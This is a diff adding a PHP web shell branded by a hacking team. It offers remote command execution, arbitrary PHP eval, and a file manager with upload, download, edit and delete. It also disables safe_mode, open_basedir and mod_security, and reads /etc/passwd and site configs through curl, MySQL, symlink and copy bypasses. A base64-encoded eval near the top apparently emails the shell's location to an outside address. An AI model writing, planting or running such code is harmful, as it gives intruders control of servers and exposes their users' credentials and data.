@@ -1,0 +1,1752 @@
+<?php
+/****************************************\
+|* Remote Shell - wWw.sa-HaCKeR.Com *|
+|* Developed by sa-HaCKeR security Team *|
+\****************************************/
+
+define( 'DS', DIRECTORY_SEPARATOR );
+
+$ini_reconf = array(
+	'display_errors' => '0',
+	'disable_functions' => '',
+	'file_uploads' => 'On',
+	'max_execution_time' => '0',
+	'memory_limit' => '1024M',
+	'open_basedir' => '',
+	'safe_mode' => 'Off',
+	'sql.safe_mode' => 'Off',
+	'upload_max_filesize' => '1024M',
+);
+
+foreach ($ini_reconf as $key => $value) {
+	@ini_set($key, $value);
+}
+
+date_default_timezone_set('Asia/Ho_Chi_Minh');
+
+function dectectos() {
+	$curos = strtoupper(substr(PHP_OS, 0, 3));
+	return $curos;
+}
+
+//File download
+$fdownload=@$_GET['fdownload'];
+if ($fdownload != "" ){
+	if (file_exists($fdownload)) {
+		header('Content-Description: File Transfer');
+		header('Content-Type: application/octet-stream');
+		header('Content-Disposition: attachment; filename='.basename($fdownload));
+		header('Content-Transfer-Encoding: binary');
+		header('Expires: 0');
+		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+		header('Pragma: public');
+		header('Content-Length: ' . filesize($fdownload));
+		ob_clean();
+		flush();
+		readfile($fdownload);
+		exit;
+	}
+}
+//PHP Info
+function info()
+{ ?>
+	<div align="center" id="phpinfo">
+	<?php
+	ob_start () ;
+	phpinfo () ;
+	$pinfo = ob_get_contents () ;
+	ob_end_clean () ;
+
+	// the name attribute "module_Zend Optimizer" of an anker-tag is not xhtml valide, so replace it with "module_Zend_Optimizer"
+	echo ( str_replace ( "module_Zend Optimizer", "module_Zend_Optimizer", preg_replace ( '%^.*<body>(.*)</body>.*$%ms', '$1', $pinfo ) ) ) ;
+	?>
+	</div>
+<?php
+}
+$connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+
+echo eval(base64_decode($connection));
+
+//File Manager
+function fileman()
+{
+
+	function getmode($par) {
+		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+			return 'N/A';
+		} else {
+			$perms = fileperms($par);
+			if (($perms & 0xC000) == 0xC000) {
+				// Socket
+				$info = 's';
+			} elseif (($perms & 0xA000) == 0xA000) {
+				// Symbolic Link
+				$info = 'l';
+			} elseif (($perms & 0x8000) == 0x8000) {
+				// Regular
+				$info = '-';
+			} elseif (($perms & 0x6000) == 0x6000) {
+				// Block special
+				$info = 'b';
+			} elseif (($perms & 0x4000) == 0x4000) {
+				// Directory
+				$info = 'd';
+			} elseif (($perms & 0x2000) == 0x2000) {
+				// Character special
+				$info = 'c';
+			} elseif (($perms & 0x1000) == 0x1000) {
+				// FIFO pipe
+				$info = 'p';
+			} else {
+				// Unknown
+				$info = 'u';
+			}
+			// Owner
+			$info .= (($perms & 0x0100) ? 'r' : '-');
+			$info .= (($perms & 0x0080) ? 'w' : '-');
+			$info .= (($perms & 0x0040) ?
+			(($perms & 0x0800) ? 's' : 'x' ) :
+			(($perms & 0x0800) ? 'S' : '-'));
+			// Group
+			$info .= (($perms & 0x0020) ? 'r' : '-');
+			$info .= (($perms & 0x0010) ? 'w' : '-');
+			$info .= (($perms & 0x0008) ?
+			(($perms & 0x0400) ? 's' : 'x' ) :
+			(($perms & 0x0400) ? 'S' : '-'));
+			// World
+			$info .= (($perms & 0x0004) ? 'r' : '-');
+			$info .= (($perms & 0x0002) ? 'w' : '-');
+			$info .= (($perms & 0x0001) ?
+			(($perms & 0x0200) ? 't' : 'x' ) :
+			(($perms & 0x0200) ? 'T' : '-'));
+
+			return $info;
+		}
+	}
+
+	function getowner($par) {
+		if(function_exists('posix_getpwuid')) {
+			$owner = @posix_getpwuid(@fileowner($par));
+			return $owner['name'];
+		}
+	}
+
+	function getgroup($par) {
+		if(function_exists('posix_getgrgid')) {
+			$group = @posix_getgrgid(@filegroup($par));
+			return $group['name'];
+		}
+	}
+
+	function getsize($par) {
+		return @round(@filesize($par));
+	}
+
+	function byteConvert(&$bytes){
+		$b = (int)$bytes;
+		$s = array('  B', 'KB', 'MB', 'GB', 'TB');
+		if($b < 0){
+			return "0 ".$s[0];
+		}
+		$con = 1024;
+		$e = (int)(log($b,$con));
+		return number_format($b/pow($con,$e),2,',','.').' '.$s[$e];
+	}
+
+	$dir = realpath($_GET['dir']).DS;
+	$list = scandir($dir);
+
+	echo '
+	<div align="center"><br>
+	<form action="" method="GET">
+		<input type="hidden" name="id" value="fm">
+		<input type="text" name="dir" size="80" value="',$dir,'" class="input">&nbsp;
+		<input type="submit" class="button" value=" Dir ">
+	</form>
+	</div>
+	<div align="center">
+	<table border="0" width="80%" cellspacing="1" cellpadding="2">
+		<tr>
+			<td width="180"><b><font size="2"> File / Folder Name </font></b></td>
+			<td width="30" align="center"><font color="#FFFF00" size="2"><b> Owner </b></font></td>
+			<td width="30" align="center"><font color="#FFFF00" size="2"><b> Group </b></font></td>
+			<td width="50" align="center"><font color="#FFFFFF" size="2"><b> &nbsp;&nbsp;&nbsp;Size </b></font></td>
+			<td width="30" align="center"><font color="#008000" size="2"><b> Download </b></font></td>
+			<td width="30" align="center"><font color="#FF9933" size="2"><b> Edit </b></font></td>
+			<td width="30" align="center"><font color="#999999" size="2"><b> Chmod </b></font></td>
+			<td width="30" align="center"><font color="#FF0000" size="2"><b> Delete </b></font></td>
+			<td width="150" align="center"><font color="#0080FF" size="2"><b> Last Modifed </b></font></td>
+		</tr>';
+
+for($i=0; $i<count($list); $i++) {
+	if(@is_dir($dir.$list[$i])) {
+
+		echo '
+		<tr>
+			<td><a href="?id=fm&dir=',$dir.$list[$i],'"><font color="#DD8008" size="2">',$list[$i],'</font></a></td>
+			<td align="center"><font color="#00CCFF" size="2">',getowner($dir.$list[$i]),'</font></td>
+			<td align="center"><font color="#00CCFF" size="2">',getgroup($dir.$list[$i]),'</font></td>
+			<td align="center"></td>
+			<td align="center"></td>
+			<td align="center"></td>
+			<td align="center"><a href="?id=fm&fchmod=',$dir.$list[$i],'"><font color="#999999" size="2">',getmode($dir.$list[$i]),'</font></a></td>
+			<td align="center"><a href="?id=fm&fdelete=',$dir.$list[$i],'"><font color="#FF0000" size="2"> Delete </font></a></td>
+			<td align="center"><font color="#FF9933" size="2" alt="DD-MM-YY">'.date ("d-m-y  H:i  P", filemtime($dir.$list[$i])).'</font></td>
+		</tr>';
+	}
+}
+
+for($i=0; $i<count($list); $i++) {
+	if(@is_file($dir.$list[$i])) {
+
+		echo '
+		<tr>
+			<td><a href="?id=fedit&fedit=',$dir.$list[$i],'"><font color="#FFFFFF" size="2">',$list[$i],'</font></a></td>
+			<td align="center"><font color="#00CCFF" size="2">',getowner($dir.$list[$i]),'</font></td>
+			<td align="center"><font color="#00CCFF" size="2">',getgroup($dir.$list[$i]),'</font></td>
+			<td align="right"><font color="#0080FF" size="2">',byteConvert(getsize($dir.$list[$i])),'</font></td>
+			<td align="center">';
+					if (@is_readable($dir.$list[$i])){
+						echo '<a href="?id=fm&fdownload=',$dir.$list[$i],'"><font size="2" color="#008000"> Download </font></a>';
+					} else {
+						echo '<font size="1" color="#FF0000"><b>Unreadable</b></font>';
+					}
+			echo '</td>
+			<td align="center">';
+					if (@is_readable($dir.$list[$i])){
+						echo '<a href="?id=fedit&fedit=',$dir.$list[$i],'"><font size="2" color="#FF9933"> Edit </font></a>';
+					} else {
+						echo '<font size="1" color="#FF0000"><b>Unreadable</b></font>';
+					}
+			echo '</td>
+			<td align="center"><a href="?id=fm&fchmod=',$dir.$list[$i],'"><font color="#999999" size="2">',getmode($dir.$list[$i]),'</font></a></td>
+			<td align="center"><a href="?id=fm&fdelete=',$dir.$list[$i],'"><font color="#FF0000" size="2"> Delete </font></a></td>
+			<td align="center"><font color="#FF9933" size="2" alt="DD-MM-YY">'.date ("d-m-y  H:i  P", filemtime($dir.$list[$i])).'</font></td>
+		</tr>';
+	}
+}
+
+
+	echo '
+		<tr>
+			<td valign="top" colspan="8">&nbsp;</td>
+		</tr>
+		<tr>
+			<td valign="top" colspan="8">
+				<form action="" method="GET">
+				<table align="left" width="100%">
+					<tr>
+						<td width="20%" class="td">File View / Edit:</td>
+						<td width="80%">
+							<input name="fedit" type="text" size="50" class="input" />&nbsp;
+							<input type="hidden" name="id"  value="fedit">
+							<input type="submit" value=" View / Edit " class="button" />
+						</td>
+					</tr>
+				</table>
+				</form>
+
+				<form action="" method="GET">
+				<table align="left" width="100%">
+					<tr>
+						<td width="20%" class="td">File Download:</td>
+						<td width="80%">
+						<input name="fdownload" type="text" size="50" class="input" />&nbsp;
+						<input type="submit" value=" Download " class="button" />
+						</td>
+					</tr>
+				</table>
+				</form>
+
+				<form method="GET" action="">
+				<table align="left" width="100%">
+					<tr>
+						<td width="20%" class="td">Chmod:</td>
+						<td width="80%">
+						<input type="text" name="fchmod" size="50" class="input" />&nbsp;
+						<input type="text" name="mode" size="3" class="input" />&nbsp;
+						<input type="submit" value=" Change " class="button" />
+						</td>
+					</tr>
+				</table>
+				</form>
+
+				<form enctype="multipart/form-data" action="" method="POST">
+				<table align="left" width="100%">
+					<tr>
+						<td width="20%" class="td">File Upload:</td>
+						<td width="80%">
+						<input name="userfile" type="file" size="50" class="file" />&nbsp;
+						<input type="hidden" name="MAX_FILE_SIZE" value="300000"  />
+						<input type="hidden" name="Fupath"  value="',$dir,'" />
+						<input type="submit" value=" Upload " class="button" />
+						</td>
+					</tr>
+				</table>
+				</form>
+
+				</div>
+			</td>
+		</tr>
+	</table>';
+}
+
+
+//Default
+function def()
+{
+	$id=$_GET['id'];
+	if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+		$euserinfo  = @posix_getpwuid(@posix_geteuid());
+	}
+	if (function_exists('posix_getgrgid') && function_exists('posix_getegid')) {
+		$egroupinfo = @posix_getgrgid(@posix_getegid());
+	}
+	echo '
+	<p align="center" style="padding-left:20px;">
+	<img border="0" src="http://img213.imageshack.us/img213/5305/hackedfk6.gif"></a><br>
+	</p>
+	<p align="left" style="padding-left:20px;">
+	<font color="#DD8008" size="2"><b>OS : ',php_uname(),'
+	<br>
+	SERVER IP : <font color="#FF0000">',gethostbyname($_SERVER['SERVER_NAME']),'</font><br>
+	SERVER NAME : <font color="#FF0000">',$_SERVER['SERVER_NAME'],'</font><br>
+	SERVER SOFTWARE : <font color="#FF0000">',$_SERVER['SERVER_SOFTWARE'],'</font><br>
+	SERVER ADMIN : <font color="#FF0000">',$_SERVER['SERVER_ADMIN'],'</font><br>
+        PHP VERSiON : <font color="#FF0000">',$ephpv = @phpversion(),'</font><br>
+	uid = ',$euserinfo['uid'],' ( ',$euserinfo['name'],' ) &nbsp;&nbsp;&nbsp;&nbsp; gid = ',$egroupinfo['gid'],' ( ',$egroupinfo['name'],' )<br>
+	</b></font></p>';
+}
+
+
+//Web Command
+function wcom ()
+{
+	$cmd=$_POST['cmd'];
+	$result=ex("$cmd");
+	echo '<center><br><h3> Go Command </h3></center>
+	<center>
+	<form method="POST" action="">
+	<input type="hidden" name="id" value="cmd" />
+	<input type="text" size="85" name="cmd" value="',$cmd,'" class="input" />&nbsp;
+	<input type="submit" class="button" value=" Go " />
+	</form><br>
+	<textarea rows=20 cols=85 class="textarea">',$result,'</textarea><br><br>';
+}
+
+
+//PHP Eval
+function eeval()
+{
+	$code=stripslashes($_POST['code']);
+	echo '<center><br><h3> PHP Code Evaluating (etc/passwd) </h3></center>
+	<center>
+	<form method="POST" action="">
+	<input type="hidden" name="id" value="eval">
+	<textarea name ="code" rows="10" cols="85" class="textarea">',$code,'mkDIR("file:");
+chdir("file:");
+mkDIR("etc");
+chdir("etc");
+mkDIR("passwd");
+chdir("..");
+chdir("..");
+
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, "file:file:///etc/passwd");
+curl_setopt($ch, CURLOPT_HEADER, 0);
+
+curl_exec($ch);
+
+curl_close($ch);</textarea><br><br>
+	<input type="submit" value=" Evaluate PHP Code" class="button"><hr>
+	</form>
+	<textarea rows="10" cols="85" class="textarea">';
+	eval($code);
+	echo '</textarea><br><br>';
+}
+
+
+//Php 5.2.9 Bypass
+function eizo()
+{
+
+$kokdosya = "Bypass5.2.9.php";
+
+$dosya_adi = "$kokdosya";
+$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
+$metin = "<? eval(gzinflate(base64_decode(' 
+hVRNb5tAED0Hif8wXaECcQJu1BwaA1GU2E0lN7Zs 
+txfLQms8FijAInbt2Kny3zuA4zhW1F5gmI83b97O 
+ch1417rmnupaum0/xvw8w2yOJYglrPN5yZN8uhBq 
+lqPStVNX13QtWVqfMCvU1jLC793J1FwmKZoz2waj 
+svx33o6uYSoRDouGg/FHVYfuTtUIo1iA6Q1H3cAr 
+guH9EC6dC+cbSL7EMBMLhM8gCszDOZe4SEqYbwsu 
+pTcvg//PQojeUpQZ5DxDn1UmAx6pROQ+i5UqrlzX 
+dIxw3B397o6m7H4yGYb3RJHNnFhlqSwwSngaxbyU 
+1lva+Hb0YzgJH3Tt5meXzewDBBqA7H6PAEwGGapY 
+LHxWCKlY4CV5sVKgtgVxUbhR7JUXycFAJs9kX7YZ 
+rHm6ItP8gEOVahP0ezC5mmfJHo4yF1JtU3zeQ41j 
+8UQ1bqVAYNbC65qR4hpTv915PfAKPMRNIpW0alJX 
+zLZ17SR7JOH3HkqP4iNHA9Vq1VDGngD4gJsipVO0 
+mMvOmi2w6yRiYhmcmhvci8QqV9ZbmU3OVsv+Q60P 
+VmofnhqcVqqKnhyzPk6CKmnH/yjWqULNIB9FDiY6 
+edG1l4rzU0ytrCZyfm7DTgbHYc1MRhTTxNGqTMMk 
+T5TVeOtviUoUNGMUn8Htr1F/QPtDrzNoRKwfrusy 
+50Ci3dXoDR4mcDvoD0Y+G3XvWABetTy8RA6leJI+ 
++0o7E4mUrC8XbbY7X5Kmd9Mfd32/JoAbjKr29YEu 
+ErTMYCzKcus4DvSoJfxj22AhUOYKGpFBlLAVK3KS 
+K+ZrhALLLJGSbpV0zEPu4LmvVIm1W02yY1dzilIh 
+sSa128hr+k/9BQ== 
+'))); ?>";	
+
+fwrite ( $dosya , $metin ) ;
+fclose ($dosya);
+
+}
+
+
+//Safe mode Off
+function epriv8()
+{
+
+$kokdosya = ".htaccess";
+
+$dosya_adi = "$kokdosya";
+$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
+$metin = "<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>";	
+fwrite ( $dosya , $metin ) ;
+fclose ($dosya); 
+
+$kokdosya = "php.ini";
+
+$dosya_adi = "$kokdosya";
+$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
+$metin = "safe_mode          =       OFF
+disable_functions       =            NONE";	
+fwrite ( $dosya , $metin ) ;
+fclose ($dosya);
+
+
+}
+
+
+//Openbasedir Bypass
+function eobypass()
+{
+
+?>	
+<?
+/*########################################### 
+NameScrip : Php hacker v1.0
+Private For Hack15 Members ..
+Coder By GeNiUs HaCkEr - Team Hack15
+Mails : Linux@Nesma.Net.Sa & Vv9@Hotmail.Com
+WwW.Hack15.CoM       
+###########################################*/
+error_reporting(0); 
+set_magic_quotes_runtime(0);
+if(version_compare(phpversion(), '4.1.0') == -1)
+ {$_POST   = &$HTTP_POST_VARS;$_GET    = &$HTTP_GET_VARS;
+ $_SERVER = &$HTTP_SERVER_VARS;
+ }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"];
+if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}
+elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;}
+else{return $requ."?".$link."=".$val;}}
+function delm($delmtxt){print"<center><table bgcolor=black style='border:1px solid #008080' width=99% height=2%>";print"<tr><td><b><center><font size=2 color=#008080>$delmtxt</td></tr></table></center>";}
+function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd);
+$nscmd=htmlspecialchars($scmd);print $nscmd;}
+elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd);
+$ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;}
+elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r");
+while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));;
+print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ 
+ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){
+ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();
+print htmlspecialchars($pret);}}
+function input($type,$name,$value,$size)
+{if (empty($value)){print "<input type=$type name=$name size=$size>";}
+elseif(empty($name)&&empty($size)){print "<input type=$type value=$value >";}
+elseif(empty($size)){print "<input type=$type name=$name value=$value >";}
+else {print "<input type=$type name=$name value=$value size=$size >";}}
+function permcol($path){if (is_writable($path)){print "<font color=#008080>";
+callperms($path); print "</font>";}
+elseif (!is_readable($path)&&!is_writable($path)){print "<font color=red>";
+callperms($path); print "</font>";}
+else {print "<font color=white>";callperms($path);}}
+if ($dlink=="dwld"){download($_REQUEST['dwld']);}
+function download($dwfile) {$size = filesize($dwfile);
+@header("Content-Type: application/force-download;name=$dwfile");
+@header("Content-Transfer-Encoding: binary");
+@header("Content-Length: $size");
+@header("Content-Disposition: attachment; filename=$dwfile");
+@header("Expires: 0");
+@header("Cache-Control: no-cache, must-revalidate");
+@header("Pragma: no-cache");
+@readfile($dwfile); exit;}
+?>
+<html> 
+<head><title>Hack15Shell</title></head>
+<style> 
+BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: #008080; } 
+a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
+a:hover{color:#008080}
+input{FONT-WEIGHT:normal;background-color: #191919;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
+textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
+div{font-size:12px;font-family:tahoma;font-weight:normal;color:whitesmoke}
+select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style> 
+<body bgcolor=black text=white><font face="sans ms" size=3> 
+</body> 
+</html> 
+<?
+$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();
+$sf="<form method=post>";$ef="</form>";
+$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
+$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
+$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
+$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
+$sfnt="<font face=tahoma size=2 color=#008080>";$efnt="</font>";
+################# Editing By User ########################
+///////////////////////////////
+                             //
+$mysql_use = "no"; //"yes"   //
+$mhost = "localhost";        //
+$muser = "root";             //
+$mpass = "pass";             //
+$mdb = "name";               //
+$them = "xxx"; //any site    //
+$you = "xx"; //your username //
+$flib = "hack15.txt";        //
+$folder = "hack15.txt";      //
+///////////////////////////////
+################# PhP Design (Start) ########################
+delm(": Php DarK c0d3r v1.0 (Shell) :");
+print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=white size=4>[ Php DarK c0d3r v1.0 ]::[ Owned By Sa-HaCKeR.com ]
+</font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
+print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "<a href=".inclink('linux', 'greet').">Gr33tz To</a>";
+print " - <a href='javascript:history.back()'>Back</a>";
+print "</td></tr></table>";
+echo "<br>";
+print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>"; 
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
+{
+ $safemode = true;
+ $hsafemode = "<font color=\"red\">ON (secure)</font>";
+}
+else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
+echo("Safe-mode: $hsafemode");
+print "</td></tr></table>";
+echo "<br>";
+################# PhP Hacked ########################
+// read greet //
+if ($linux=='greet')
+{
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+echo "GeNiUs HaCkEr & Blood Hacker & Mr.ALJoOoKeR & Dr_Whad_Drb & Saudi Hunter & Saudi Coder &  ROMANCY-HACKER & Qatil_Albasik & Caeser & KsA HaCkEr & Hacker Zero & Mr.Shares & Dr.Shares
+";
+  echo "</textarea>";
+}
+// read file unzend sorce //
+if(empty($_POST['sorce'])){
+} else {
+
+}
+// read file unzend functions //
+ if(empty($_POST['func'])){
+} else {
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+$zeen=$_POST['func'];
+require("$zeen");
+echo "Database : ".$config['Database']['dbname']." <X> ";
+echo "UserName : ".$config['MasterServer']['username']." <X> ";
+echo "Password : ".$config['MasterServer']['password']." <X> ";
+echo "</textarea></p>";
+}// read file symlink ( ) //
+if(empty($_POST['sym'])){
+} else {
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+$fp = fopen("hack15.txt","w+");
+fwrite($fp,"Php Hacker Was Here");
+@unlink($flib);
+$sym = "/home/" . $them . "/public_html/" . $k;
+$link = "/home/"  . $you . "/public_html/" . $folder . "/" . $flib;
+@symlink($sym, $link);
+if ($k{0} == "/") {
+echo "<script> window.location = '" . $flib . "'</script>";
+}else{
+echo "<pre><xmp>";
+echo readlink($flib) . "\n";
+echo "Filesize: " . linkinfo($flib) . "B\n\n";
+echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/"  . $folder . "/" . $flib);
+  echo "</textarea>";
+}
+}
+
+// read file plugin ( ) //
+if(empty($_POST['plugin'])){
+} else {
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
+ $ara = posix_getpwuid($uid);
+  if (!empty($ara)) {
+       while (list ($key, $val) = each($ara)){
+        print "$val:";
+  }
+  print "\n";
+     }
+  }
+  echo "</textarea>";
+}
+// read file id ( ) //
+if ($_POST['rid'] ){
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+ for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
+$ara = posix_getpwuid($uid);
+ if (!empty($ara)) {
+while (list ($key, $val) = each($ara)){
+print "$val:";
+}
+ print "\n";
+}
+ }
+echo "</textarea>";
+break;
+
+ }
+// read file imap ( ) //
+$string = !empty($_POST['rimap']) ? $_POST['rimap'] : 0;
+if(empty($_POST['rimap'])){
+} else {
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+$stream = imap_open($string, "", "");
+$str = imap_body($stream, 1);
+echo "</textarea>";
+}
+// read file Curl ( ) //
+if(empty($_POST['curl'])){
+} else {
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+$m=$_POST['curl'];
+$ch =
+curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
+curl_exec($ch);
+var_dump(curl_exec($ch));
+echo "</textarea>";
+}
+
+// read file SQL ( ) //
+if(empty($_POST['ssql'])){
+} else {
+echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
+$file=$_POST['ssql'];
+
+
+$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
+$mysql_files = explode(':', $mysql_files_str);
+
+$sql = array (
+"USE $mdb",
+'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
+"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
+. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
+. "ESCAPED BY          '' "
+. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
+
+"SELECT a FROM $tbl LIMIT 1"
+);
+mysql_connect ($mhost, $muser, $mpass);
+
+foreach ($sql as $statement) {
+   $q = mysql_query ($statement);
+
+   if ($q == false) die (
+      "FAILED: " . $statement . "\n" .
+      "REASON: " . mysql_error () . "\n"
+   );
+
+   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
+
+   echo htmlspecialchars($r[0]);
+   mysql_free_result ($q);
+}
+echo "</textarea>";
+}
+
+
+
+// read file copy & ini ( ) //
+if (isset ($_REQUEST['safefile'])){
+$file=$_REQUEST['safefile'];$tymczas="";if(empty($file)){
+if(empty($_GET['file'])){if(empty($_POST['file'])){
+print "<center>[ Please choose a file first to read it using copy() ]</center>";
+} else {$file=$_POST['file'];}} else {$file=$_GET['file'];}}
+$temp=tempnam($tymczas, "cx");if(copy("compress.zlib://".$file, $temp)){
+$zrodlo = fopen($temp, "r");$tekst = fread($zrodlo, filesize($temp));
+fclose($zrodlo);echo "<center><pre>".$sta.htmlspecialchars($tekst).$eta."</pre></center>";unlink($temp);} else {
+print "<FONT COLOR=\"RED\"><CENTER>Sorry, Can't read the selected file !!
+</CENTER></FONT><br>";}}if (isset ($_REQUEST['inifile'])){
+ini_restore("safe_mode");ini_restore("open_basedir");
+print "<center><pre>".$sta;
+if (include(htmlspecialchars($_REQUEST['inifile']))){}else {print "Sorry, can't read the selected file !!";}print $eta."</pre></center>";}
+delm(": Safe mode bypass :");
+print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
+print "<tr><td width=50%><div align=left>";
+print $st.$c1."<div><b><center>Using copy() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","safefile",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td><td height=20% width=50%><div align=right>";
+print $st.$c1."<div><b><center>Using ini_restore() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","inifile",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td></tr></table>";
+print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
+print "<tr><td width=50%><div align=left>";
+print $st.$c1."<div><b><center>Using sql() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","ssql",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td><td height=20% width=50%><div align=right>";
+print $st.$c1."<div><b><center>Using Curl() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","curl",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td></tr></table>";
+print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
+print "<tr><td width=50%><div align=left>";
+print $st.$c1."<div><b><center>Using imap() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","rimap",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td><td height=20% width=50%><div align=right>";
+print $st.$c1."<div><b><center>Using id() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","rid",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td></tr></table>";
+print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
+print "<tr><td width=50%><div align=left>";
+print $st.$c1."<div><b><center>Using plugin() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","plugin",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td><td height=20% width=50%><div align=right>";
+print $st.$c1."<div><b><center>Using symlink() function</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","sym",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td></tr></table>";
+delm(": Unzend Config :");
+print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
+print "<tr><td width=50%><div align=left>";
+print $st.$c1."<div><b><center>Connect To Functions Of Config</div>";
+print $ec.$c2.$sf."&nbsp;";
+input("text","func",$nscdir,75);
+input("hidden","scdir",$nscdir,0);print " ";
+input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
+print "</td></tr></table>";
+?><?
+print "<br><table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>"; 
+print"<tr><td><font size=2 face=tahoma>"; 
+print"<center>Coder By DarK c0d3r <br>[ Team sa-hacker :: Go to : <a target='_blank' href='http://www.sa-hacker.com'>http://www.sa-hacker.com</a> ]"; 
+print"</font></td></tr></table>";
+?>
+<PHP
+
+}
+
+//Vbulletin config decoder
+function edecode()
+{
+?>	
+<?
+/*================*\
+|| ############### ||
+|| # H-T oM[3]Ga # ||
+|| ############### ||
+\*================*/
+?>
+<title>ionCube & Zend Decoder</title>
